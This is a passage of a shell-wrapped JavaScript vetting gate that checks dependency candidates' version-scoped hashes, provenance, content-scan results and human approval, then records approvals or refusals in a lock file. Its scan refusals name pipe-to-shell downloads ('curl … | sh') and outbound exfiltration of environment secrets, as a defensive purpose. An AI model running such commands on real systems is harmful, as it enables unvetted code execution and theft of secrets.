        if (DIGEST_KEYS.has(key) && /^sha(256|512)[:-]/.test(o)) published.push(o);
        return;
      }
      if (Array.isArray(o)) return o.forEach((x) => walk(x, depth + 1, key));
      if (typeof o === "object") return Object.entries(o).forEach(([k, v]) => walk(v, depth + 1, k));
    };
    // SCOPED TO THE PINNED VERSION, not to the whole response. Walking the entire record meant
    // the hash was compared against every digest the registry has EVER published for this
    // package: a packument carrying 1.0.0 and 1.2.3 admitted a candidate pinning 1.2.3 while
    // claiming the integrity string of 1.0.0, which is a downgrade with the gate agreeing. The same
    // shape let an OCI candidate pin the index tag and present a per-architecture layer digest.
    // The stated job is that the digest a lockfile pins is the one published FOR THAT VERSION.
    //
    // Falls back to the whole record only when the response is flat (one tag, one version), and
    // says which of the two it did, because a silent fallback is how a scoped check quietly
    // stops being scoped.
    let scope = record, scopeWhy = "the whole recorded response";
    if (record.versions && typeof record.versions === "object" && !Array.isArray(record.versions)) {
      if (Object.prototype.hasOwnProperty.call(record.versions, version)) {
        scope = record.versions[version];
        scopeWhy = `the entry the response publishes for ${version}`;
      } else {
        // The version check above has already blocked in this case; scoping to nothing here
        // keeps this check from silently passing on a sibling versions digest.
        scope = null;
        scopeWhy = `no entry for ${version} in the recorded response`;
      }
    }
    walk(scope, 0, "");
    if (!published.length) {
      block("hash", `${name}@${version} claims an integrity hash the recorded response does not publish`,
        "the same integrity string the registry returned",
        `${scopeWhy} publishes no sha256/sha512 value at all`);
    } else if (!published.includes(hash)) {
      block("hash", `the claimed hash for ${name}@${version} is not the one the registry published`,
        `${published[0]} (from ${scopeWhy})`,
        hash);
    }
  }
}

// --- provenance: TWO fields, each real text, never collapsed.
if (!text(manifest["publisher-auth"])) {
  block("provenance", "no `publisher-auth` recorded",
    "who may publish under this name — registry namespace authentication, and when it was checked",
    JSON.stringify(manifest["publisher-auth"] ?? null));
}
if (!text(manifest["build-attestation"])) {
  block("provenance", "no `build-attestation` recorded",
    "which CI built this artifact — or the words `none published`, recorded as its own field",
    JSON.stringify(manifest["build-attestation"] ?? null));
}

// --- content scan (the shell did the searching; the verdicts are recorded here)
//
// A SCAN THAT COULD NOT RUN IS A BLOCK, NOT A WRITE-CAPABLE FLAG. Marking it write-capable
// would only require a `human-ok`, and `human-ok` is a string the CANDIDATE writes in its own
// candidate.json — so a candidate that broke the scanner could also sign off on the breakage.
// The one honest verdict for "the check did not happen" is refusal.
if (scanBroke) {
  block("content-scan", "the content scan did not complete, so nothing about this tree was checked",
    "a scan that ran to completion", scanBroke);
}
if (hitPipe) {
  block("content-scan", "the fetched tree pipes a download into something that executes",
    "no `curl … | sh` — code fetched at run time is code nothing vetted", hitPipe);
}
if (hitExfil) {
  block("content-scan", "the fetched tree sends environment or secret material outbound",
    "no exfiltration pattern", hitExfil);
}

// --- human-ok
const HUMAN_OK = /^[A-Za-z][A-Za-z0-9_-]*[ \t]+(\d{4})-(\d{2})-(\d{2})\b/;
const okRaw = typeof manifest["human-ok"] === "string" ? manifest["human-ok"].trim() : "";
let okValid = false;
const m = HUMAN_OK.exec(okRaw);
if (m) {
  const [, y, mo, d] = m.map(Number);
  const dt = new Date(Date.UTC(y, mo - 1, d));
  // A real calendar date, not a shape: `0000-00-00` satisfied the old regex. One day of
  // slack, because an approval recorded in a timezone ahead of UTC is today for the person
  // who gave it and tomorrow here — and refusing a genuine same-day OK teaches people that
  // the gate is broken rather than strict.
  okValid = dt.getUTCFullYear() === y && dt.getUTCMonth() === mo - 1 && dt.getUTCDate() === d
    && dt.getTime() <= Date.now() + 86400000;
}
if (writeCapable === "1" && !okValid) {
  block("human-ok", `${name} is write-capable and carries no recorded human OK — ${wcapWhy}`,
    "`human-ok: <name> <YYYY-MM-DD>` in candidate.json, a real past date, recorded by the person who agreed",
    okRaw || "(absent)");
}

// ---------------------------------------------------------------------------
// Write the decision. A lock file that exists and does not parse is NEVER overwritten: doing
// so silently erased every previously-approved row and every previously-refused hostile
// package, on one hand-edit or one merge conflict marker.
// ---------------------------------------------------------------------------
// ONE WRITER AT A TIME. Read-modify-write with no mutex lost decisions outright: eight
// concurrent vets against one lock recorded five rows, and the three that vanished included
// REFUSALS -- so "the refusal is recorded so the same candidate is not proposed again blind",
// which this file prints a few lines below, was false whenever two vets overlapped. A torn read
// is worse than a lost row: it trips the refusing-to-overwrite branch and wedges the gate until
// a human intervenes.
//
// mkdir is the atomic primitive that exists everywhere. EEXIST means somebody else holds it.
// The lock directory is removed on every exit path, and a stale one from a killed process is
// reported rather than silently stolen -- stealing it is how two writers get in again.
const lockDir = lockPath + ".lockdir";
let heldLock = false;
for (let i = 0; i < 50 && !heldLock; i++) {
  try { fs.mkdirSync(lockDir); heldLock = true; }
  catch (e) {
    if (e.code !== "EEXIST") break;
    // Busy-wait without a timer: this program is short-lived and synchronous throughout.
    const until = Date.now() + 100;
    while (Date.now() < until) { /* spin */ }
  }
}
if (!heldLock) {
  out.push("", `Another vet is holding ${lockDir}, or it was left behind by a killed run.`,
    "Nothing was recorded. Remove that directory if no vet is running.",
    "This is a failure, not a PASS.");
  console.log(out.join("\n"));
  process.exit(1);
}
const releaseLock = () => { try { fs.rmSync(lockDir, { recursive: true, force: true }); } catch { /* nothing left to do */ } };
process.on("exit", releaseLock);

let lock = { capabilities: [], refusals: [] };
if (fs.existsSync(lockPath)) {
  // A path that exists and is not a regular file is a different problem from a corrupt one,
  // and saying "it does not parse" about a directory sends you to fix the wrong thing.
  //
  // lstat, NOT stat: stat follows a symlink, so `--lock <symlink>` wrote JSON straight through
  // to whatever it pointed at. A lock file is a record, and a record that can be redirected by
  // a link is not one.
  let st = null;
  try { st = fs.lstatSync(lockPath); } catch { /* handled as unwritable below */ }
  if (st && !st.isFile()) {
    out.push("", `The lock path ${lockPath} is not a file. Nothing was recorded.`,
      "This is a failure, not a PASS.");
    console.log(out.join("\n"));
    process.exit(1);
  }
  const existing = readJson(lockPath);
  if (!existing) {
    out.push("", `The lock file at ${lockPath} exists and does not parse. Refusing to overwrite it —`,
      "it may hold approvals and refusals that would be silently erased. Fix or remove it.");
    console.log(out.join("\n"));
    process.exit(1);
  }
  lock = existing;
}
if (!Array.isArray(lock.capabilities)) lock.capabilities = [];
if (!Array.isArray(lock.refusals)) lock.refusals = [];

const today = new Date().toISOString().slice(0, 10);
const cls = writeCapable === "1" ? `write-capable (human OK recorded: ${okRaw})` : "read-only";
const facts = {
  name, registry, version,
  hash: hash || (isSkill ? `git ${version}` : null),
  "publisher-auth": text(manifest["publisher-auth"]),
  "build-attestation": text(manifest["build-attestation"]),
  // Kept, because a claim that was made CHECKABLE and then discarded at the moment of
  // decision is not checkable by anyone afterwards. --audit calls a row stale at 30 days
  // and whoever re-verifies needs the URL that was actually fetched.
  "registry-url": text(manifest["registry-url"]),
  checked: today,
};

if (blocks.length) {
  const priorApproval = lock.capabilities.find((c) => c && c.name === name);
  lock.capabilities = lock.capabilities.filter((c) => !c || c.name !== name);
  const row = { ...facts, "refused-on": [...new Set(blocks)].join(", "),
                why: out.find((l) => l.startsWith("BLOCK")).replace(/^BLOCK \[[^\]]+\] /, "") };
  if (priorApproval) row["superseded-approval-of"] = priorApproval.version;
  const i = lock.refusals.findIndex((c) => c && c.name === name);
  if (i >= 0) lock.refusals[i] = row; else lock.refusals.push(row);
} else {
  // A name that was refused and is now admitted must not read as both at once.
  const priorRefusal = lock.refusals.find((c) => c && c.name === name);
  lock.refusals = lock.refusals.filter((c) => !c || c.name !== name);
  // The candidate is usually fetched to a temp directory, and this file is COMMITTED — an
  // absolute path here records one machine and one afternoon rather than the candidate.
  // Repo-relative when it lives here, otherwise the fact that it was fetched and not retained.
  // (No apostrophes in this block: the whole program is a single-quoted shell string, and one
  // closes it. That is the third time this file has taught me that.)
  const abs = path.resolve(candidateDir);
  const inRepo = abs.startsWith(path.resolve(".") + path.sep);
  const row = {
    ...facts,
    source: inRepo ? path.relative(".", abs).split(path.sep).join("/") : `${registry}:${name}@${version}, fetched and not retained`,
    class: cls,
  };
  if (priorRefusal) row["previously-refused-on"] = priorRefusal["refused-on"];
  const i = lock.capabilities.findIndex((c) => c && c.name === name);
  if (i >= 0) lock.capabilities[i] = row; else lock.capabilities.push(row);
}
const byName = (a, b) => (a.name < b.name ? -1 : a.name > b.name ? 1 : 0);
lock.capabilities.sort(byName);
lock.refusals.sort(byName);

// The write is checked. A failed write used to print PASS, exit 0, and name a file it had
// never written — `--lock <a directory>` reported success and recorded nothing.
try {
  // Write to a sibling temp and rename. rename is atomic on one filesystem, so a crash mid-write
  // leaves either the old lock or the new one -- never the truncated file that a direct
  // writeFileSync leaves, which the refusing-to-overwrite branch above then reads as corruption
  // and refuses to repair.
  const tmp = lockPath + ".tmp";
  fs.writeFileSync(tmp, JSON.stringify(lock, null, 2) + "\n");
  fs.renameSync(tmp, lockPath);
} catch (e) {
  out.push("", `Could not write the lock file at ${lockPath}: ${e.message}`,
    "Nothing was recorded. This is a failure, not a PASS.");
  console.log(out.join("\n"));
  process.exit(1);
}

if (blocks.length) {
  out.push("", `${blocks.length} condition(s) refused ${name}@${version}. It was NOT admitted.`,
    `The refusal is recorded in ${lockPath} so the same candidate is not proposed again blind.`);
  console.log(out.join("\n"));
  process.exit(1);
}

out.push(`PASS  ${name}@${version} — ${cls}`,
  `  hash:        ${facts.hash}`,
  `  publisher:   ${facts["publisher-auth"]}`,
  `  build:       ${facts["build-attestation"]}`,
  `  recorded in: ${lockPath}`,
  "",
  "Vetted is not installed. This wrote a lock row and no dependency (ADR-0110).");
console.log(out.join("\n"));
process.exit(0);
' "$CANDIDATE" "$ALLOWLIST" "$LOCK" "$HIT_PIPE" "$HIT_EXFIL" "$WRITE_CAPABLE" "$WCAP_WHY" "$SCAN_BROKE"
